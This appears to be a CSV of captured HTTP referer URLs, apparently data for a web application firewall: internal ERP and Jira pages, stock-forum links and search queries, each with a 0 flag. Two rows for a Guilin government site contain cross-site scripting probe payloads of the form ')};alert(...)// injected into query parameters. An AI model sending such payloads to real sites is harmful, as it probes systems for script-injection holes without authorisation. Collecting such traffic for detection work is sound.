httpReferer,encoder,mode_is
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Account.SOBNaturalAccountListUI&sId=3000nid&bId=1001101159162149&ShowType=NavigatePage&ParentForm=47a75dd9-aaa6-4f39-a17c-b71c1c3559b4&__fsk=__SK20620*__SK20620&__curOId=1001712070000049,229,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Process.Voucher.VoucherAuditList&VoucherCategory=VoucherApprove&sId=3002nid&mId=1001101160306475&__curOId=1001812050036831,230,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Process.Voucher.VoucherReverseList&sId=3002nid&bId=1001101160306474&ShowType=NavigatePage&VoucherCategory=VoucherReverse&ParentForm=9407687f-3186-4f56-a7f6-c3af5dd733f7&__fsk=__SK13969*__SK13969&__curOId=1001712070000521,231,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.INV.INV2020_20&sId=3017nid&bId=1001101160308100&ShowType=NavigatePage&ParentForm=e3df0726-8f25-49f4-a28e-9ce1cba03835&__fsk=__SK19518*__SK19518&__curOId=1001712070000049,232,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.INV.INV2020_20&sId=3017nid&bId=1001101160308100&ShowType=NavigatePage&ParentForm=e3df0726-8f25-49f4-a28e-9ce1cba03835&__fsk=__SK29186*__SK29186&__curOId=1001712070000049,233,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.PM.PM3020_20&sId=3016nid&bId=1001101160311113&ShowType=NavigatePage&PR_Type=PM3020&ParentForm=4e0a5ff2-3fcd-4403-8d36-068f37667c4f&__fsk=__SK47288*__SK47288&__curOId=1001712070000049&ID=1001910250008813,234,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.SD.SDA010_20&sId=3015nid&bId=1001101160311911&ShowType=NavigatePage&ParentForm=7dde4c9d-98a2-4bb1-bc42-bccd74e4e1ac&__fsk=__SK86413*__SK86413&__curOId=1001712070000049,235,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=170endLayerId,236,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=180endLayerId,237,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=252endLayerId,238,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=12endLayerId,239,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=19endLayerId,240,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=22endLayerId,241,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=25endLayerId,242,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=30endLayerId,243,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=3endLayerId,244,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=64endLayerId,245,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=6endLayerId,246,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=129endLayerId,247,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=185endLayerId,248,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=196endLayerId,249,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=206endLayerId,250,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=208endLayerId,251,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=210endLayerId,252,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&QueryNameField=NaturalAccount_Name&QueryField=NaturalAccount_Code&NaturalAccount_Code=660240&ValueByClick=660240&__sk=__SK36221&__curOId=1001801170012724&layerId=39endLayerId,253,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK14794&__curOId=1001801170012724&layerId=85endLayerId,254,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK36221&__curOId=1001801170012724&layerId=43endLayerId,255,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK36221&__curOId=1001801170012724&layerId=94endLayerId,256,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=24endLayerId,257,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=30endLayerId,258,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=35endLayerId,259,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=37endLayerId,260,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=45endLayerId,261,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=221101&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%B7%A5%E8%B5%84&__sk=__SK36221&__curOId=1001801170012724&layerId=59endLayerId,262,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=22110701&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%85%BB%E8%80%81%E4%BF%9D%E9%99%A9&__sk=__SK83948&__curOId=1001801170012724&layerId=47endLayerId,263,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=22110702&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%8C%BB%E7%96%97%E4%BF%9D%E9%99%A9&__sk=__SK83948&__curOId=1001801170012724&layerId=49endLayerId,264,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=224104&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E7%A4%BE%E4%BF%9D&__sk=__SK83948&__curOId=1001801170012724&layerId=33endLayerId,265,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=66010106&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E4%BD%8F%E6%88%BF%E5%85%AC%E7%A7%AF%E9%87%91&__sk=__SK83948&__curOId=1001801170012724&layerId=28endLayerId,266,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=66024099&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&QueryNameField=NaturalAccount_Name&QueryField=NaturalAccount_Code&NaturalAccount_Code=6601&ValueByClick=6601&__sk=__SK36221&__curOId=1001801170012724&layerId=48endLayerId,267,0
"http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=d8c3da38-6e99-49fa-8e9f-23dd7a01bc0d&CtrlId=861efa0d-7ad4-4f3f-af82-e2af3fd64767&chromeType=4&ShowType=ModalRef&CurOrgID=1001712070000049&CurDate=2020-02-24%2018%3A45%3A28&UBF_CustomFilter=Org%20=%201001712070000049%20and%20BusinessType%20in%20(316,317,318,319,321,327,328,%20320)%20and%20IsFillin%20=%20%27false%27%20and%20%20IsInitPO%20=%20%27false%27&ValueByClick=%E7%94%9F%E4%BA%A7%E7%89%A9%E6%96%99%E9%87%87%E8%B4%AD&MultiOrgID=&EntityFullName=UFIDA.U9.PM.Pub.PODocType&__sk=__SK80131&__curOId=1001712070000049&layerId=14endLayerId",268,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=f4e7e41f-f46b-4c5b-b7a2-5be7ecea9d76&CtrlId=d06691f7-b9fc-4825-90c1-42b542942753&chromeType=4&ShowType=ModalRef&DPBook=1001712200000841&MultiOrgID=1001712070000049&EntityFullName=UFIDA.U9.Base.SOB.SOBAccountingPeriod&__sk=__SK91823&__curOId=1001712070000049&layerId=19endLayerId,269,0
http://fanyi.youdao.com/,270,0
http://finance.sina.com.cn/realstock/company/sh000001/nc.shtml,271,0
http://finance.sina.com.cn/realstock/company/sh600200/nc.shtml?from=BaiduAladin,272,0
http://finance.sina.com.cn/realstock/company/sh600312/nc.shtml,273,0
http://finance.sina.com.cn/realstock/company/sh600312/nc.shtml?from=BaiduAladin,274,0
http://finance.sina.com.cn/realstock/company/sh601099/nc.shtml,275,0
http://finance.sina.com.cn/realstock/company/sh601111/nc.shtml,276,0
http://finance.sina.com.cn/realstock/company/sh601162/nc.shtml,277,0
http://finance.sina.com.cn/realstock/company/sh601988/nc.shtml,278,0
http://finance.sina.com.cn/realstock/company/sh603416/nc.shtml,279,0
http://finance.sina.com.cn/realstock/company/sh688023/nc.shtml,280,0
http://finance.sina.com.cn/realstock/company/sz000988/nc.shtml,281,0
http://finance.sina.com.cn/realstock/company/sz002185/nc.shtml,282,0
http://finance.sina.com.cn/realstock/company/sz002460/nc.shtml,283,0
http://finance.sina.com.cn/realstock/company/sz300456/nc.shtml,284,0
http://finance.sina.com.cn/realstock/company/sz300803/nc.shtml,285,0
http://finance.sina.com.cn/roll/2020-02-26/doc-iimxxstf4381844.shtml,286,0
http://ftp-new-pc.pconline.com.cn/1406a788573ce787ad5351940dcf7e4e/pub/download/201902/pconline1550817108484.exe,287,0
http://ftrans.cn/solutions/large-file-transfer/?utm_source=baidu_sem&utm_campaign=V5.52.02.%E5%A4%A7%E6%96%87%E4%BB%B6-%E5%8A%9F%E8%83%BD&utm_term=%E5%A4%A7%E6%96%87%E4%BB%B6%20%E4%BC%A0%E8%BE%93&e_creative=21622197755&e_adposition=cl1&e_pagenum=1&e_keywordid=68900829524&e_keywordid2=68900829524,288,0
http://gaj.guilin.gov.cn/site/public/TechListSearchgzdt.aspx,289,0
http://gaj.guilin.gov.cn/site/public/TechListSearchgzdt.aspx?__EVENTVALIDATION=%27)};alert(49453)//,290,0
http://gaj.guilin.gov.cn/site/public/techzs.aspx?menuid=400610,291,0
http://gaj.guilin.gov.cn/site/public/techzs.aspx?menuid=400610&%27)};alert(17412)//=2,292,0
http://gb.oversea.cnki.net//KCMS/docdown/pubdownload.aspx?dk=kdoc%3acajdown%3add97542b6cfe67efabfded5a2704e65a,293,0
http://gb.oversea.cnki.net//KCMS/docdown/pubdownload.aspx?dk=kdoc%3apdfdown%3a2dfdb899c2586cd70f2752b1f3637d5d,294,0
http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=CINS201304017&dbcode=CJFD&dbname=CJFD2013&UID=WEEvREcwSlJHSldTTEYzVDhUSFJPcG1FSzJicGNiZm1sVlltOGU2ZlBURT0%3d%249A4hF_YAuvQ5obgVAqNKPCYcEjKensW4IQMovwHtwkF4VYPoHbKxJw!!&autoLogin=0,295,0
http://go.sogou.com/css/api/CaleWeather.css,296,0
http://greatagain.*.com.cn/,297,0
http://gswsdj.zjzwfw.gov.cn/entrance.html,298,0
"http://guba.eastmoney.com/concept/list,300033.html?tabtype=99",299,0
"http://guba.eastmoney.com/list,000063.html",300,0
"http://guba.eastmoney.com/list,000545.html",301,0
"http://guba.eastmoney.com/list,000623.html?from=BaiduAladdin",302,0
"http://guba.eastmoney.com/list,000725.html",303,0
"http://guba.eastmoney.com/list,002503.html",304,0
"http://guba.eastmoney.com/list,300716.html?from=BaiduAladdin",305,0
"http://guba.eastmoney.com/list,600237.html?from=BaiduAladdin",306,0
"http://guba.eastmoney.com/list,601618,1,f.html",307,0
"http://guba.eastmoney.com/list,601618.html?from=BaiduAladdin",308,0
"http://guba.eastmoney.com/list,688023.html?from=BaiduAladdin",309,0
"http://guba.eastmoney.com/list,688023_2.html",310,0
"http://guba.eastmoney.com/list,688090.html",311,0
"http://guba.eastmoney.com/list,688090.html?from=BaiduAladdin",312,0
"http://guba.eastmoney.com/news,000545,903787464.html",313,0
"http://guba.eastmoney.com/news,300620,906171084.html",314,0
"http://guba.eastmoney.com/news,600237,906591061.html",315,0
"http://guba.eastmoney.com/news,688023,884823196.html",316,0
"http://guba.eastmoney.com/news,688023,902906270.html?from=BaiduAladdin",317,0
"http://guba.eastmoney.com/news,688023,904746106.html",318,0
"http://guba.eastmoney.com/news,688023,905739584.html",319,0
"http://guba.eastmoney.com/news,688023,905783139.html",320,0
"http://guba.eastmoney.com/news,688023,906168377.html",321,0
"http://guba.eastmoney.com/news,688023,906339802.html",322,0
"http://guba.eastmoney.com/news,688023,906843961.html",323,0
"http://guba.eastmoney.com/news,cjpl,906572074.html",324,0
"http://guba.eastmoney.com/news,dcblog,834638907.html",325,0
http://guba.eastmoney.com/news_soft.aspx?color=b&code=688023&id=906843961,326,0
http://guba.eastmoney.com/qa/qa_search.aspx?company=300033&keyword=&questioner=&qatype=1,327,0
http://guba.eastmoney.com/qa/search?type=2&code=300033,328,0
http://hanlp.com/,329,0
http://hao.qq.com/?unc=Af31026&s=o400493_1,330,0
http://help.iqiyi.com/questionInfo/3186.html,331,0
http://home.firefoxchina.cn/,332,0
http://hz.zjzwfw.gov.cn/col/col1962/index.html?tabid=45023,333,0
"http://image.baidu.com/search/detail?ct=503316480&z=undefined&tn=baiduimagedetail&ipn=d&word=%E5%A3%81%E7%BA%B8&step_word=&ie=utf-8&in=&cl=&lm=-1&st=undefined&hd=undefined&latest=undefined&copyright=undefined&cs=3730267016,1291960719&os=3279078104,2183212087&simid=3446727280,174503358&pn=121&rn=1&di=20900&ln=3132&fr=&fmq=1582535805214_R&fm=&ic=undefined&s=undefined&se=&sme=&tab=0&width=1920&height=1080&face=undefined&is=0,0&istype=0&ist=&jit=&bdtype=0&spn=0&pi=0&gsm=5a&oriquery=%E5%A3%81%E7%BA%B8&objurl=http%3A%2F%2Fimg.pconline.com.cn%2Fimages%2Fupload%2Fupc%2Ftx%2Fwallpaper%2F1208%2F15%2Fc0%2F12924355_1344999165550.jpg&rpstart=0&rpnum=0&adpicid=0&force=undefined&ctd=1582535841487^3_1519X763%1",334,0
http://image.baidu.com/search/index?tn=baiduimage&ct=201326592&lm=-1&cl=2&ie=gb18030&word=%D7%C0%C3%E6%B1%DA%D6%BD&fr=ala&ala=1&pos=0&alatpl=wallpaper&oriquery=%E6%A1%8C%E9%9D%A2%E5%A3%81%E7%BA%B8,335,0
http://image.baidu.com/search/index?tn=baiduimage&ct=201326592&lm=-1&cl=2&ie=gb18030&word=confluence%D6%D0%D3%D0%D0%F2%C1%D0%B1%ED%BA%F3%B2%E5%C8%EB%CD%BC%C6%AC&fr=ala&ala=2&alatpl=sp&pos=0,336,0
http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=app%E9%95%BF%E8%A1%A8%E5%8D%95,337,0
http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8,338,0
http://info.pinyin.sogou.com/ime_push/getxinci.php?h=D53B43D1F76E2ECF8815D05DB3DCE579&v=9.5.0.3517&r=0000_sogou_pinyin_67d&passport=&ppversion=3.1.0.2216&id=Y10000001&newwordver=1582532700&activeprocess=chrome.exe&configver=604&pageurl=link_index_new.php&adurl=http://info.pinyin.sogou.com/ime_push/sgse_ad/sgse_s_all_new.php,339,0
http://isdp-dg.huawei.com/sdcloud/portal/index.html,340,0
http://iwencai.com/unifiedwap/result?w=%E7%A7%91%E5%88%9B%E6%9D%BF%20%E4%B8%9A%E7%BB%A9%E5%BF%AB%E6%8A%A5&querytype=&issugs,341,0
http://jira.das-security.cn/secure/Dashboard.jspa,342,0
http://jira.info.*.com.cn/browse/APT-865,343,0
http://jira.info.*.com.cn/browse/APT-876,344,0
http://jira.info.*.com.cn/browse/APT-879?filter=-2,345,0
http://jira.info.*.com.cn/browse/UT-245,346,0
http://jira.info.*.com.cn/browse/UT-259,347,0
http://jira.info.*.com.cn/browse/UT-263,348,0
http://jira.info.*.com.cn/browse/UT-274?filter=-2&jql=reporter%20in%20(currentUser())%20order%20by%20created%20DESC,349,0
http://jira.info.*.com.cn/browse/UT-286,350,0
http://jira.info.*.com.cn/projects/SUMAP/summary,351,0
http://jira.info.*.com.cn/secure/Dashboard.jspa,352,0
http://jira.info.*.com.cn/secure/Dashboard.jspa?selectPageId=10904,353,0
http://jira.ngwdev.com/browse/WAF-365?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,354,0
http://jira.ngwdev.com/browse/WAF-373,355,0
http://jira.ngwdev.com/browse/WAF-391?filter=-2,356,0
http://jira.ngwdev.com/browse/WAF-392?filter=-2,357,0
http://jira.ngwdev.com/browse/WAF-393?filter=-2,358,0
http://jira.ngwdev.com/browse/WAF-405?filter=-2,359,0
http://jira.ngwdev.com/browse/WAF-406?filter=-2,360,0
http://jira.ngwdev.com/browse/WAF-415,361,0
http://jira.ngwdev.com/browse/WAF-418,362,0
http://jira.ngwdev.com/browse/WAF-419,363,0
http://jira.ngwdev.com/browse/WAF-419?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,364,0
http://jira.ngwdev.com/browse/WAF-420,365,0
http://jira.ngwdev.com/browse/WAF-421?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,366,0
http://jira.ngwdev.com/browse/WAF-423,367,0
http://jira.ngwdev.com/browse/WAF-424?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.*,368,0
http://jira.ngwdev.com/browse/WAF-424?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,369,0
http://jira.ngwdev.com/browse/WAF-427,370,0
http://jira.ngwdev.com/browse/WAF-427?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,371,0
http://jira.ngwdev.com/browse/WAF-429?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,372,0
http://jira.ngwdev.com/browse/WAF-430,373,0
http://jira.ngwdev.com/browse/WAF-435,374,0
http://jira.ngwdev.com/browse/WAF-436?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,375,0
http://jira.ngwdev.com/browse/WAF-437?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,376,0
http://jira.ngwdev.com/browse/WAF-437?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,377,0
http://jira.ngwdev.com/browse/WAF-438,378,0
http://jira.ngwdev.com/browse/WAF-439,379,0
http://jira.ngwdev.com/browse/WAF-440,380,0
http://jira.ngwdev.com/browse/WAF-441,381,0
http://jira.ngwdev.com/download/resources/rw-smart-checklist-biz:resources/checklist.html?context=agile_board,382,0
http://jira.ngwdev.com/download/resources/rw-smart-checklist-biz:resources/checklist.html?context=issue_details,383,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.*,384,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,385,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20DESC,386,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13),387,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,388,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20DESC,389,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,390,0
http://jira.ngwdev.com/issues/?jql=project+%3D+WAF+AND+fixVersion+%3D+4.6.*,391,0
http://jira.ngwdev.com/login.jsp?permissionViolation=true&os_destination=%2Fbrowse%2FWAF-438&page_caps=&user_role=,392,0
